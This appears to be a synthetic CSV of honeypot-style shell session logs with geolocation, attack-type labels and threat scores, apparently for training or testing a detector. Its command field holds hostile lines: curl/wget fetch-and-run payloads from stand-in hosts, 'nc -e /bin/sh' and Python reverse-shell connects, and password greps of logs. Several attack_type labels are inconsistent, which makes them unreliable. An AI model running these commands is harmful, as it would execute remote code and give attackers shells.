session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10345,129.74.85.164,2025-10-04T06:31:29.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20; ls -la; id; uname -a,0,4,0,,52.269628,13.125967,DE,benign,0.12
sess_10509,68.47.48.152,2025-10-04T06:31:29.746466Z,guest,chmod +x /tmp/h; /tmp/h &,1,2,0,,-24.058506,-46.244813,BR,reverse_shell,0.085
sess_10430,159.159.27.232,2025-10-04T06:31:32.746466Z,ftp,ps aux | grep sshd; grep -R 'password' /var/log || true,0,2,0,,38.348213,-122.665858,US,benign,0.06
sess_10350,155.222.158.233,2025-10-04T06:31:34.746466Z,postgres,ps aux | grep sshd,0,1,0,,37.175011,-122.040944,US,benign,0.03
sess_10416,111.91.228.158,2025-10-04T06:31:39.746466Z,guest,curl -s http://evil.tld/payload.sh | sh,3,1,1,sha256:ff697ef653b19e5d276488c16229a9c062383a18019977f5faae7d19d2842f9d,36.196841,140.009014,JP,payload_exec,0.605
sess_10505,108.49.219.89,2025-10-04T06:31:39.746466Z,oracle,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,52.631038,13.897467,DE,malware_fetch,0.09
sess_10487,222.154.138.176,2025-10-04T06:31:42.746466Z,admin,find / -maxdepth 2 -type f | head -n 20; ls -la; id; uname -a,1,4,0,,37.374876,127.470946,KR,benign,0.145
sess_10363,126.151.134.139,2025-10-04T06:31:44.746466Z,postgres,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,5,3,0,,28.036364,77.637195,IN,payload_exec,0.215
sess_10367,26.184.212.211,2025-10-04T06:31:45.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',0,3,0,,37.589882,126.49947,KR,recon,0.09
sess_10469,147.149.231.159,2025-10-04T06:31:45.746466Z,unknown,cat /etc/passwd | grep root,0,1,0,,-23.935926,-46.083392,BR,recon,0.03
sess_10370,101.161.166.217,2025-10-04T06:31:47.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,0,4,0,,37.835186,-122.125906,US,benign,0.12
sess_10481,145.171.33.239,2025-10-04T06:31:49.746466Z,admin,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,51.759696,0.178492,GB,reverse_shell,0.115
sess_10502,41.196.230.81,2025-10-04T06:31:49.746466Z,postgres,cat /etc/passwd | grep root,4,1,0,,55.352773,37.534117,RU,benign,0.13
sess_10383,85.197.118.251,2025-10-04T06:31:51.746466Z,ftp,grep -R 'password' /var/log || true,0,1,0,,28.25255,77.76915,IN,benign,0.03
sess_10397,141.81.193.141,2025-10-04T06:31:51.746466Z,root,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',0,3,0,,37.820957,126.881498,KR,benign,0.09
sess_10482,46.102.95.214,2025-10-04T06:31:52.746466Z,guest,find / -maxdepth 2 -type f | head -n 20,1,1,0,,56.043627,37.286724,RU,benign,0.055
sess_10348,37.134.79.22,2025-10-04T06:31:56.746466Z,guest,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,6,3,0,,39.936291,116.01213,CN,reverse_shell,0.24
sess_10356,203.74.28.69,2025-10-04T06:31:57.746466Z,admin,cat /etc/passwd | grep root,3,1,0,,35.235854,140.013475,JP,benign,0.105
sess_10442,28.251.102.157,2025-10-04T06:31:58.746466Z,test,cat /etc/passwd | grep root,2,1,0,,56.250931,37.87578,RU,benign,0.08
sess_10347,75.40.107.43,2025-10-04T06:32:00.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,37.595279,127.573216,KR,payload_exec,0.09
sess_10371,103.231.229.246,2025-10-04T06:32:00.746466Z,root,echo 'hello' > /tmp/x; cat /tmp/x; echo 'hello' > /tmp/x; cat /tmp/x,0,4,0,,51.173664,0.299065,GB,benign,0.12
sess_10394,23.97.149.113,2025-10-04T06:32:00.746466Z,guest,ps aux | grep sshd; ps aux | grep sshd,1,2,0,,48.427288,2.748072,FR,recon,0.085
sess_10392,94.234.126.110,2025-10-04T06:32:04.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,2,3,0,,56.282767,37.703621,RU,reverse_shell,0.14
sess_10499,213.204.182.122,2025-10-04T06:32:04.746466Z,postgres,find / -maxdepth 2 -type f | head -n 20,1,1,0,,-23.396455,-47.07177,BR,benign,0.055
sess_10496,90.227.115.142,2025-10-04T06:32:05.746466Z,guest,cat /etc/passwd | grep root; ls -la; id; uname -a,2,4,0,,35.304657,140.290168,JP,benign,0.17
sess_10391,206.7.138.244,2025-10-04T06:32:08.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,6,1,0,,51.947955,-0.139869,GB,benign,0.18
sess_10434,221.78.253.193,2025-10-04T06:32:08.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,7,3,0,,48.949909,2.7624,FR,reverse_shell,0.265
sess_10369,158.183.234.180,2025-10-04T06:32:15.746466Z,admin,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:f83153880457551ccfd25fda8f647199b01c5c49041b39034f234ee983bfab79,-22.95238,-46.701685,BR,payload_exec,0.555
sess_10479,181.184.203.38,2025-10-04T06:32:15.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:156bb7e71f0a7c936488e5c729dacaf5c11be129813e4606bdfbc4c0a04195b6,-23.47726,-46.974466,BR,reverse_shell,0.59
sess_10508,97.85.153.94,2025-10-04T06:32:20.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,0,1,0,,40.499673,116.289833,CN,benign,0.03
sess_10447,38.183.249.22,2025-10-04T06:32:21.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:eff30264ae41bf0f3c3b29b11f4a11211f4c7479e22072ee329ad8e2d4f50b9d,37.433021,127.329287,KR,malware_fetch,0.59
sess_10333,142.131.128.178,2025-10-04T06:32:23.746466Z,oracle,find / -maxdepth 2 -type f | head -n 20,1,1,0,,28.718092,76.641821,IN,benign,0.055
sess_10489,187.185.71.210,2025-10-04T06:32:23.746466Z,user,cat /etc/passwd | grep root; whoami; pwd; ls -la,0,4,0,,-23.317407,-46.407643,BR,recon,0.12
sess_10346,176.202.138.228,2025-10-04T06:32:24.746466Z,unknown,python3 -c 'print(2+2)'; echo 'hello' > /tmp/x; cat /tmp/x,4,3,0,,35.239548,139.373253,JP,benign,0.19
sess_10471,44.242.177.108,2025-10-04T06:32:24.746466Z,unknown,cat /etc/passwd | grep root; ls -la; id; uname -a,1,4,0,,51.310453,-0.033354,GB,benign,0.145
sess_10448,175.157.255.137,2025-10-04T06:32:27.746466Z,root,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,8,3,1,sha256:faa7557c62207cb11c5e4c1dd837d0a413454f90e72c1129f5c3af4b205a796a,40.272724,116.60818,CN,reverse_shell,0.79
sess_10410,33.254.121.96,2025-10-04T06:32:28.746466Z,guest,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,38.108248,-121.923375,US,malware_fetch,0.03
sess_10393,148.19.55.116,2025-10-04T06:32:30.746466Z,root,echo 'hello' > /tmp/x; cat /tmp/x,1,2,0,,28.633252,77.365778,IN,benign,0.085
sess_10464,15.245.156.42,2025-10-04T06:32:32.746466Z,user,grep -R 'password' /var/log || true,2,1,0,,48.478535,2.798062,FR,recon,0.08
sess_10417,156.67.47.209,2025-10-04T06:32:36.746466Z,admin,ps aux | grep sshd; grep -R 'password' /var/log || true,0,2,0,,37.402639,126.598024,KR,benign,0.06
sess_10511,15.95.255.55,2025-10-04T06:32:36.746466Z,guest,grep -R 'password' /var/log || true; python3 -c 'print(2+2)'; nc -lvp 4444 &,1,3,0,,51.195849,0.16792,GB,benign,0.115
sess_10349,19.182.166.222,2025-10-04T06:32:40.746466Z,postgres,echo 'hello' > /tmp/x; cat /tmp/x; cat /etc/passwd | grep root,1,3,0,,-23.602648,-46.334606,BR,benign,0.115
sess_10399,166.252.121.56,2025-10-04T06:32:40.746466Z,postgres,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,7,3,1,sha256:46741b5e2745072fa62df7e38dc8c75593560da03ea7604c995348d0648f97cf,-23.406781,-46.564242,BR,payload_exec,0.765
sess_10453,56.45.145.107,2025-10-04T06:32:40.746466Z,unknown,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:062dd699a6b62afe41928c0eefb4695e842521deadc454351344f467e793b5e6,28.223359,77.439008,IN,payload_exec,0.53
sess_10390,17.183.40.177,2025-10-04T06:32:41.746466Z,test,python3 -c 'print(2+2)'; whoami; pwd; ls -la,0,4,0,,37.406812,-122.980725,US,benign,0.12
sess_10337,137.3.21.218,2025-10-04T06:32:43.746466Z,pi,grep -R 'password' /var/log || true; grep -R 'password' /var/log || true,0,2,0,,37.883615,126.99136,KR,benign,0.06
sess_10358,172.21.62.65,2025-10-04T06:32:43.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,9,1,0,,39.439714,116.566891,CN,malware_fetch,0.255
sess_10381,65.104.132.141,2025-10-04T06:32:44.746466Z,user,python3 -c 'print(2+2)',4,1,0,,51.539559,-0.421252,GB,benign,0.13
sess_10513,18.125.158.119,2025-10-04T06:32:45.746466Z,ftp,python3 -c 'print(2+2)'; ls -la; id; uname -a,0,4,0,,28.978146,77.399405,IN,recon,0.12
sess_10418,181.169.166.117,2025-10-04T06:32:46.746466Z,root,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:a0bfe79730bd3e51d7eafc91c9489b6238af62819d513b959687a997d0b88760,39.722539,116.497014,CN,reverse_shell,0.615
sess_10362,135.224.150.139,2025-10-04T06:32:47.746466Z,ubuntu,whoami; pwd; ls -la; ps aux | grep sshd,4,4,0,,55.348212,37.654665,RU,benign,0.22
sess_10340,167.175.187.48,2025-10-04T06:32:52.746466Z,oracle,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,37.715775,-122.333708,US,reverse_shell,0.09
sess_10360,208.45.127.41,2025-10-04T06:32:52.746466Z,admin,grep -R 'password' /var/log || true; grep -R 'password' /var/log || true,2,2,0,,38.016494,-122.069641,US,recon,0.11
sess_10411,124.12.247.232,2025-10-04T06:32:53.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",4,3,0,,51.300206,0.195578,GB,payload_exec,0.19
sess_10427,189.217.92.117,2025-10-04T06:32:57.746466Z,oracle,ps aux | grep sshd; cat /etc/passwd | grep root,1,2,0,,37.843596,127.232556,KR,recon,0.085
sess_10495,91.63.238.29,2025-10-04T06:33:03.746466Z,test,python3 -c 'print(2+2)'; echo 'hello' > /tmp/x; cat /tmp/x; nc -lvp 4444 &,0,4,0,,52.260334,13.525467,DE,benign,0.12
sess_10461,158.117.44.106,2025-10-04T06:33:04.746466Z,postgres,echo 'hello' > /tmp/x; cat /tmp/x,2,2,0,,51.790815,-0.431815,GB,benign,0.11
sess_10497,136.53.202.113,2025-10-04T06:33:04.746466Z,www-data,cat /etc/passwd | grep root,0,1,0,,38.076848,127.551424,KR,benign,0.03
sess_10387,149.103.70.80,2025-10-04T06:33:05.746466Z,test,curl -s http://evil.tld/payload.sh | sh,5,1,1,sha256:92b7ed5e909744e3b036059c93a95b4bb0aec828ef5fa65818bdc0bc1d942f82,37.635308,127.516322,KR,payload_exec,0.655
sess_10338,112.113.65.14,2025-10-04T06:33:06.746466Z,unknown,chmod +x /tmp/h; /tmp/h &,1,2,0,,40.127806,116.01716,CN,malware_fetch,0.085
sess_10368,70.197.97.50,2025-10-04T06:33:06.746466Z,www-data,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,40.19953,116.72694,CN,malware_fetch,0.115
sess_10403,167.29.55.147,2025-10-04T06:33:07.746466Z,admin,ps aux | grep sshd; find / -maxdepth 2 -type f | head -n 20,2,2,0,,29.126426,77.346148,IN,benign,0.11
sess_10384,154.11.20.64,2025-10-04T06:33:08.746466Z,guest,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,48.678896,2.502477,FR,payload_exec,0.09
sess_10472,178.167.248.152,2025-10-04T06:33:08.746466Z,ftp,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,55.361885,37.329309,RU,payload_exec,0.03
sess_10486,102.24.148.75,2025-10-04T06:33:08.746466Z,www-data,find / -maxdepth 2 -type f | head -n 20,3,1,0,,35.741955,140.138632,JP,recon,0.105
sess_10353,72.139.145.167,2025-10-04T06:33:09.746466Z,unknown,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:b9ce3f21dbcbed03609b2b671d97d73565497c51d8b2bdd4b6f1ce9d5cd70450,28.755175,76.935561,IN,malware_fetch,0.53
sess_10351,45.176.146.121,2025-10-04T06:33:10.746466Z,root,grep -R 'password' /var/log || true; ps aux | grep sshd; nc -lvp 4444 &,0,3,0,,51.184858,-0.719138,GB,benign,0.09
sess_10409,18.173.192.161,2025-10-04T06:33:10.746466Z,test,cat /etc/passwd | grep root; ls -la; id; uname -a,4,4,0,,-23.298692,-46.907503,BR,benign,0.22
sess_10445,187.246.62.146,2025-10-04T06:33:11.746466Z,pi,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,52.696489,13.243426,DE,reverse_shell,0.03
sess_10510,140.153.221.170,2025-10-04T06:33:13.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",2,3,0,,38.091031,-122.802679,US,reverse_shell,0.14
sess_10425,108.207.195.112,2025-10-04T06:33:16.746466Z,ubuntu,cat /etc/passwd | grep root; echo 'hello' > /tmp/x; cat /tmp/x,1,3,0,,52.266165,13.852283,DE,benign,0.115
sess_10402,108.34.218.216,2025-10-04T06:33:18.746466Z,admin,curl -s http://evil.tld/payload.sh | sh,2,1,1,sha256:0278b087134422a06432dd9cfede931fd9942bcfd7f0ddbe45488304e24ab9df,55.785375,37.852295,RU,malware_fetch,0.58
sess_10421,135.58.237.84,2025-10-04T06:33:21.746466Z,admin,whoami; pwd; ls -la,2,3,0,,51.623086,0.256039,GB,benign,0.14
sess_10361,43.249.119.82,2025-10-04T06:33:22.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; ps aux | grep sshd,0,2,0,,51.069079,0.350596,GB,benign,0.06
sess_10424,151.27.0.181,2025-10-04T06:33:23.746466Z,pi,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,48.729722,2.133953,FR,malware_fetch,0.03
sess_10352,106.96.210.226,2025-10-04T06:33:24.746466Z,oracle,curl -s http://evil.tld/payload.sh | sh,2,1,1,sha256:f07f65c03dcb9ab39563545790800d01ff79b03736ed67dfed9df6ea3162c78e,55.471376,37.523987,RU,payload_exec,0.58
sess_10431,53.18.155.187,2025-10-04T06:33:25.746466Z,guest,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,52.095838,0.242875,GB,payload_exec,0.215
sess_10440,41.44.66.97,2025-10-04T06:33:26.746466Z,unknown,python3 -c 'print(2+2)',5,1,0,,37.941437,-121.912166,US,benign,0.155
sess_10443,37.17.37.19,2025-10-04T06:33:29.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",9,3,0,,28.782302,77.728472,IN,malware_fetch,0.315
sess_10507,161.11.162.97,2025-10-04T06:33:29.746466Z,oracle,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:24126868b01627b4c33abf1bf83308f8a09217276953c0f65f13e093e0f4d5c7,37.569822,127.295885,KR,reverse_shell,0.59
sess_10376,198.201.228.193,2025-10-04T06:33:31.746466Z,ftp,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",8,3,0,,35.492902,139.662726,JP,reverse_shell,0.29
sess_10451,218.205.166.31,2025-10-04T06:33:31.746466Z,ftp,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:ccec628cb84ce7ec933bd4fdcd1ba53eb1da26b65b1c8d685609e126e66c6b44,51.076884,-0.229615,GB,malware_fetch,0.555
sess_10485,158.8.132.42,2025-10-04T06:33:34.746466Z,root,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,52.247204,13.308417,DE,payload_exec,0.215
sess_10395,126.46.57.47,2025-10-04T06:33:36.746466Z,unknown,ps aux | grep sshd; ps aux | grep sshd,2,2,0,,52.162318,13.35062,DE,benign,0.11
sess_10306,13.72.63.11,2025-10-04T06:43:59.746466Z,user,whoami; pwd; ls -la,0,3,0,,35.584685,139.866818,JP,benign,0.09
sess_10319,176.210.11.63,2025-10-04T06:54:23.746466Z,test,cat /etc/passwd | grep root,0,1,0,,-23.95089,-46.126364,BR,benign,0.03
sess_10292,108.74.27.172,2025-10-04T06:58:04.746466Z,ubuntu,grep -R 'password' /var/log || true,0,1,0,,56.097029,37.262101,RU,recon,0.03
sess_10322,186.214.76.156,2025-10-04T07:08:54.746466Z,test,grep -R 'password' /var/log || true,0,1,0,,55.947071,38.099682,RU,benign,0.03
sess_10277,103.160.218.190,2025-10-04T07:14:15.746466Z,admin,ls -la; id; uname -a,0,3,0,,38.039933,127.524107,KR,benign,0.09
sess_10314,186.84.71.115,2025-10-04T07:26:05.746466Z,test,python3 -c 'print(2+2)',0,1,0,,48.841771,1.827633,FR,benign,0.03
sess_10326,167.141.203.194,2025-10-04T07:38:14.746466Z,oracle,cat /etc/passwd | grep root; echo 'hello' > /tmp/x; cat /tmp/x,1,3,0,,36.018533,139.569456,JP,benign,0.115
sess_10315,105.119.21.172,2025-10-04T07:39:04.746466Z,ftp,ps aux | grep sshd; grep -R 'password' /var/log || true,2,2,0,,52.04387,13.96713,DE,recon,0.11
sess_10307,142.72.82.48,2025-10-04T07:42:54.746466Z,user,ls -la; id; uname -a,0,3,0,,37.86775,127.566092,KR,benign,0.09
sess_10283,68.193.206.210,2025-10-04T07:46:47.746466Z,admin,ls -la; id; uname -a; ps aux | grep sshd,2,4,0,,28.035223,77.093128,IN,benign,0.17
sess_10324,189.50.217.35,2025-10-04T07:52:07.746466Z,postgres,whoami; pwd; ls -la,0,3,0,,49.107579,2.699507,FR,benign,0.09
sess_10298,100.113.109.170,2025-10-04T08:13:14.746466Z,pi,grep -R 'password' /var/log || true,1,1,0,,40.206761,116.58656,CN,benign,0.055
sess_10278,79.47.190.209,2025-10-04T08:16:12.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,40.325006,116.767279,CN,reverse_shell,0.09
sess_10291,56.165.59.195,2025-10-04T08:18:48.746466Z,ftp,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,1,2,0,,50.922725,-0.600035,GB,benign,0.085
sess_10303,115.198.230.162,2025-10-04T08:33:03.746466Z,oracle,python3 -c 'print(2+2)'; echo 'hello' > /tmp/x; cat /tmp/x,3,3,0,,28.71663,77.450058,IN,benign,0.165
sess_10287,194.173.55.194,2025-10-04T08:35:47.746466Z,root,find / -maxdepth 2 -type f | head -n 20,5,1,0,,37.128063,126.976594,KR,benign,0.155
sess_10294,181.24.195.100,2025-10-04T08:36:22.746466Z,unknown,grep -R 'password' /var/log || true; ls -la; id; uname -a,4,4,0,,49.289134,2.283877,FR,benign,0.22
sess_10323,149.0.220.134,2025-10-04T08:37:29.746466Z,pi,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20,1,2,0,,28.903573,77.522847,IN,benign,0.085
sess_10285,95.242.186.184,2025-10-04T08:46:11.746466Z,admin,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,52.680393,13.764895,DE,malware_fetch,0.09
sess_10293,149.16.183.209,2025-10-04T08:46:12.746466Z,admin,python3 -c 'print(2+2)',3,1,0,,28.972486,76.954166,IN,benign,0.105
sess_10309,169.35.99.82,2025-10-04T08:55:17.746466Z,postgres,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,5,2,0,,-23.948133,-46.857442,BR,benign,0.185
sess_10313,198.148.68.119,2025-10-04T08:59:27.746466Z,ftp,nc -e /bin/sh 10.10.10.5 4444,5,1,0,,29.1707,77.787224,IN,payload_exec,0.155
sess_10300,149.144.12.234,2025-10-04T09:03:45.746466Z,unknown,ps aux | grep sshd; whoami; pwd; ls -la,0,4,0,,37.290048,-121.853445,US,benign,0.12
sess_10281,14.114.173.133,2025-10-04T09:05:27.746466Z,unknown,ps aux | grep sshd,2,1,0,,51.677085,-0.549415,GB,benign,0.08
sess_10316,173.140.134.149,2025-10-04T09:11:15.746466Z,user,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,36.092063,139.711695,JP,reverse_shell,0.09
sess_10297,209.154.251.203,2025-10-04T09:18:59.746466Z,ftp,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,0,3,0,,37.618196,126.8621,KR,benign,0.09
sess_10296,82.135.66.42,2025-10-04T09:22:05.746466Z,guest,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",10,3,0,,36.203854,139.807956,JP,payload_exec,0.34
sess_10288,146.24.221.215,2025-10-04T09:22:23.746466Z,postgres,python3 -c 'print(2+2)',0,1,0,,40.093226,116.534793,CN,benign,0.03
sess_10312,140.15.207.197,2025-10-04T09:23:44.746466Z,ubuntu,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,0,3,0,,55.423768,37.943874,RU,benign,0.09
sess_10318,49.95.80.93,2025-10-04T09:27:00.746466Z,unknown,ps aux | grep sshd,2,1,0,,39.879025,116.516349,CN,recon,0.08
sess_10284,20.0.46.203,2025-10-04T09:27:36.746466Z,user,python3 -c 'print(2+2)',3,1,0,,49.236506,2.765381,FR,benign,0.105
sess_10311,152.55.89.166,2025-10-04T09:28:15.746466Z,admin,grep -R 'password' /var/log || true,2,1,0,,51.78031,0.342726,GB,benign,0.08
sess_10289,93.196.214.251,2025-10-04T09:28:54.746466Z,unknown,ps aux | grep sshd; whoami; pwd; ls -la,0,4,0,,-23.427471,-46.169576,BR,benign,0.12
sess_10325,158.60.3.97,2025-10-04T09:41:21.746466Z,ubuntu,ps aux | grep sshd; ls -la; id; uname -a,0,4,0,,52.563326,13.482604,DE,benign,0.12
sess_10301,208.3.33.54,2025-10-04T09:45:39.746466Z,www-data,find / -maxdepth 2 -type f | head -n 20; cat /etc/passwd | grep root,2,2,0,,51.429685,0.252305,GB,benign,0.11
sess_10308,151.236.37.75,2025-10-04T09:46:01.746466Z,admin,python3 -c 'print(2+2)',0,1,0,,40.090768,115.927454,CN,benign,0.03
sess_10280,108.183.14.221,2025-10-04T09:49:31.746466Z,unknown,ps aux | grep sshd,1,1,0,,37.250903,-122.233432,US,benign,0.055
sess_10279,177.85.57.34,2025-10-04T09:52:43.746466Z,unknown,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:bb8f1f81515455812d1fc0e728eb293fefb1a5a73a80c1cdd65a40bba36c4098,-23.336428,-47.015787,BR,malware_fetch,0.555
sess_10302,29.78.12.118,2025-10-04T09:58:22.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:66f22e0a1cf9af82d9b31801afaa60163e798ba71ec7d3c5b9a202a6e45f2638,56.141743,38.110484,RU,malware_fetch,0.59
sess_10320,143.207.9.225,2025-10-04T09:59:06.746466Z,unknown,grep -R 'password' /var/log || true; cat /etc/passwd | grep root,1,2,0,,37.438137,-122.52648,US,benign,0.085
sess_10321,47.93.135.43,2025-10-04T10:00:22.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; ls -la; id; uname -a,0,5,0,,51.534654,0.363407,GB,recon,0.15
sess_10295,68.188.100.199,2025-10-04T10:00:33.746466Z,ubuntu,grep -R 'password' /var/log || true,2,1,0,,52.063225,12.853761,DE,benign,0.08
sess_10290,142.153.160.183,2025-10-04T10:03:49.746466Z,ftp,cat /etc/passwd | grep root,5,1,0,,37.334106,-122.166924,US,benign,0.155
sess_10304,29.183.54.75,2025-10-04T10:17:29.746466Z,www-data,whoami; pwd; ls -la,3,3,0,,48.293583,1.939788,FR,benign,0.165
sess_10305,67.69.200.204,2025-10-04T10:20:22.746466Z,ftp,whoami; pwd; ls -la,4,3,0,,52.697529,13.95387,DE,benign,0.19
sess_10317,107.114.207.91,2025-10-04T10:25:46.746466Z,pi,grep -R 'password' /var/log || true; ls -la; id; uname -a,0,4,0,,37.58395,126.714971,KR,benign,0.12
sess_10310,212.113.223.71,2025-10-04T10:32:01.746466Z,pi,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,4,3,0,,37.60539,-122.652834,US,reverse_shell,0.19
sess_10286,151.191.54.12,2025-10-04T10:47:31.746466Z,test,ls -la; id; uname -a; echo 'hello' > /tmp/x; cat /tmp/x,0,5,0,,35.637955,140.029404,JP,benign,0.15
sess_10299,40.177.228.62,2025-10-04T10:49:36.746466Z,www-data,grep -R 'password' /var/log || true,5,1,0,,-23.016515,-46.770249,BR,benign,0.155
sess_10282,222.27.5.165,2025-10-04T10:57:45.746466Z,test,find / -maxdepth 2 -type f | head -n 20; find / -maxdepth 2 -type f | head -n 20,0,2,0,,56.319974,37.077721,RU,benign,0.06
sess_10269,204.97.9.174,2025-10-04T11:32:44.746466Z,www-data,python3 -c 'print(2+2)',0,1,0,,-23.444095,-47.032876,BR,recon,0.03
sess_10242,126.37.17.76,2025-10-04T11:37:05.746466Z,pi,ls -la; id; uname -a,2,3,0,,55.812256,38.095049,RU,benign,0.14
sess_10245,86.245.102.25,2025-10-04T11:38:38.746466Z,ubuntu,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,52.861852,13.370133,DE,malware_fetch,0.18
sess_10216,202.137.60.198,2025-10-04T11:39:37.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,1,5,0,,35.702438,139.158227,JP,benign,0.175
sess_10243,34.173.247.181,2025-10-04T11:40:04.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,29.183178,77.100136,IN,recon,0.06
sess_10272,174.130.24.153,2025-10-04T11:44:42.746466Z,www-data,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:810d29e4effb64a9c4c56b08f7f23d1d8ce2eae2cd754640837c0ece11166eb9,55.812539,37.586576,RU,malware_fetch,0.64
sess_10256,55.98.102.215,2025-10-04T11:47:21.746466Z,ubuntu,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,2,3,1,sha256:36c7dca156fe66dabd7848f3e4713f357b8e1f14cd5f4127a499f23dacb73d3d,35.695652,139.854192,JP,reverse_shell,0.64
sess_10261,83.152.55.124,2025-10-04T11:49:02.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; whoami; pwd; ls -la,0,4,0,,51.087315,0.190769,GB,benign,0.12
sess_10212,208.37.8.151,2025-10-04T11:50:03.746466Z,root,grep -R 'password' /var/log || true,0,1,0,,56.010955,37.937832,RU,benign,0.03
sess_10206,35.0.109.123,2025-10-04T11:52:53.746466Z,test,ls -la; id; uname -a; python3 -c 'print(2+2)',1,4,0,,35.24811,139.176694,JP,benign,0.145
sess_10267,47.161.92.200,2025-10-04T11:53:41.746466Z,postgres,whoami; pwd; ls -la; nc -lvp 4444 &,0,4,0,,37.894751,127.069535,KR,benign,0.12
